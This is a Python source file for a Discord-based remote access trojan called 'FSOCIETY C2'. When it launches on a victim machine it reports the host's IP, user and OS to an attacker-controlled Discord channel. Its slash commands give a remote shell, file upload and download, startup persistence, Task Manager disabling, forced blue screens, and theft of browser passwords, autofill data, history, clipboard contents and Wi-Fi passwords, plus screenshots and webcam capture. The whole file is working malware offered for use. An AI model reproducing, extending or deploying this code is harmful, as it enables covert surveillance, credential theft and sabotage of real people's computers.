# Author: cybermad

import discord
import os
import sys
import asyncio
import os
from discord import app_commands
from lib.code import *


if sys.platform.startswith('win') and sys.version_info >= (3, 8):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# BOT TOKEN
TOKEN = None
# SERVER GUILD
GUILD = None

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

class FSOCIETY(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.my_channel_id = None

    async def on_ready(self):
        await self.tree.sync(guild=discord.Object(id=GUILD))

        uname = platform.uname()
        ip = socket.gethostbyname(socket.gethostname())
        user = os.getlogin()

        guild = self.get_guild(GUILD)
        if not guild:
            return

        category = await guild.create_category(f"FSOCIETY C2 | {user}")
        channel = await guild.create_text_channel("fsociety", category=category)
        self.my_channel_id = channel.id

        embed = discord.Embed(title="FSOCIETY", description="t.me/cybermads", color=discord.Color.light_grey())
        embed.add_field(name="IP", value=ip, inline=False)
        embed.add_field(name="User", value=user, inline=False)
        embed.add_field(name="OS", value=f"{uname.system} {uname.release}", inline=False)
        embed.set_image(url="https://cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?v=1734164728")
        embed.set_footer(text="FSOCIETY C2 BETA")

        await channel.send(content='@everyone', embed=embed)


client = FSOCIETY()

fsociety = app_commands.Group(name="fsociety", description="FSOCIETY commands line", guild_ids=[GUILD])

@fsociety.command(name="disabletaskmgr", description="Disable Task Manager")
async def taskmgr_disable_cmd(interaction: discord.Interaction):
    await embed(interaction, disabletaskmgr())

@fsociety.command(name="enabletaskmgr", description="Enable Task Manager")
async def taskmgr_enable_cmd(interaction: discord.Interaction):
    await embed(interaction, enabletaskmgr())

@fsociety.command(name="shell", description="Execute shell commands")
async def shell_cmd(interaction: discord.Interaction, command: str):
    result = shell(command)
    await embed(interaction, result)

@fsociety.command(name="sysinfo", description="Retrieve system information")
async def sysinfo_cmd(interaction: discord.Interaction):
    await embed(interaction, sysinfo())

@fsociety.command(name="startup", description="Manage startup program settings")
async def startup_cmd(interaction: discord.Interaction):
    await embed(interaction, startup())

@fsociety.command(name="download", description="Download file from victim")
async def cmd_download(interaction: discord.Interaction, name: str):
    path, error = download(name)
    await send(interaction, path, error)

@fsociety.command(name="upload", description="Upload file to victim")
async def cmd_upload(interaction: discord.Interaction, file: discord.Attachment):
    try:
        await file.save(file.filename)
        await embed(interaction, "Upload successful.")
    except:
        await embed(interaction, "Upload failed.")

@fsociety.command(name="openweb", description="Open a website on the target system")
@app_commands.describe(url="Website URL to open")
async def openweb_cmd(interaction: discord.Interaction, url: str):
    await embed(interaction, website(url))

@fsociety.command(name="clipboard", description="Get clipboard text")
async def clipboard_cmd(interaction: discord.Interaction):
    await send_json(interaction, clipboard())

@fsociety.command(name="audio", description="Make the system speak the given message")
async def speak_cmd(interaction: discord.Interaction, message: str):
    try:
        audio(message)
        await embed(interaction, "Done.")
    except Exception as e:
        await embed(interaction, f"{e}")

@fsociety.command(name="msgbox", description="Show a message box on the client")
async def msgbox_cmd(interaction: discord.Interaction, title: str, message: str):
    try:
        msgbox(title, message)
        await embed(interaction, "Done.")
    except Exception as e:
        await embed(interaction, f"{e}")

@fsociety.command(name="process", description="List running processes")
async def processes_cmd(interaction: discord.Interaction):
    await embed(interaction, process())

@fsociety.command(name="processkill", description="Kill a process by PID")
@app_commands.describe(pid="Process ID to kill")
async def kill_cmd(interaction: discord.Interaction, pid: int):
    await interaction.response.defer(ephemeral=True)
    await embed(interaction, processkill(pid))
    await interaction.followup.send(processkill(pid), ephemeral=True)

@fsociety.command(name="wifi", description="List saved Wi-Fi profiles and passwords")
async def wifi_cmd(interaction: discord.Interaction):
    await embed(interaction, wifi())
                    
@fsociety.command(name="getip", description="Get public IP information")
async def getip_cmd(interaction: discord.Interaction):
    await embed(interaction, getip())

@fsociety.command(name="bluescreen", description="Trigger a blue screen crash")
async def bluescreen_cmd(interaction: discord.Interaction):
    await embed(interaction, bluescreen())

@fsociety.command(name="password", description="Extract saved passwords")
async def password_cmd(interaction: discord.Interaction):
    results = []
    for browser, path in PATHS.items():
        if os.path.exists(path):
            results += extract(path, browser)
    await send_json(interaction, results)

@fsociety.command(name="autofill", description="Extract browser autofill data")
async def autofill_cmd(interaction: discord.Interaction):
    await send_json(interaction, autofill())

@fsociety.command(name="history", description="Retrieve browsing history")
async def history_cmd(interaction: discord.Interaction):
    await send_json(interaction, history())

@fsociety.command(name="wallpaper", description="Change the desktop wallpaper")
@app_commands.describe(file=".jpg .png .jifi")
async def wallpaper_cmd(interaction: discord.Interaction, file: discord.Attachment):
    result, error = await wallpaper(file)
    await embed(interaction, error or result)

@fsociety.command(name="screenshot", description="Take a screenshot")
async def screenshot_cmd(interaction: discord.Interaction):
    path, err = screenshot()
    await send(interaction, path, err)

@fsociety.command(name="webcam", description="Capture webcam photo")
async def webcam_cmd(interaction: discord.Interaction):
    path, err = webcam()
    await send(interaction, path, err)

async def embed(interaction, text):
    if len(text) > 1900:
        with open('fsociety00.txt', 'w', encoding='utf-8') as tmp:
            tmp.write(text)

        if interaction.response.is_done():
            await interaction.followup.send(file=discord.File('fsociety00.txt'), ephemeral=True)
        else:
            await interaction.response.send_message(file=discord.File('fsociety00.txt'), ephemeral=True)

        os.remove('fsociety00.txt')
    else:
        emb = discord.Embed(title="FSOCIETY", description=text, color=discord.Color.light_embed())
        emb.set_image(url="https://cdn.shopify.com/s/files/1/0693/3345/0968/files/57b1b9b7584b4c5a921c9187f5ba8ec3.jpg?v=1734164728")
        emb.set_footer(text="FSOCIETY C2 BETA")
        if interaction.response.is_done():
            await interaction.followup.send(embed=emb, ephemeral=True)
        else:
            await interaction.response.send_message(embed=emb, ephemeral=True)
                                                    
async def send(interaction, path, error):
    if error:
        await embed(interaction, error)
    else:
        await interaction.response.send_message(file=discord.File(path), ephemeral=True)
        os.remove(path)

async def send_json(interaction, data):
    await interaction.response.defer(ephemeral=True)
    if not data:
        await embed(interaction, "None.")
        return

    text = json.dumps(data, indent=2, ensure_ascii=False)
    await embed(interaction, text)

client.tree.add_command(fsociety)
client.run(TOKEN)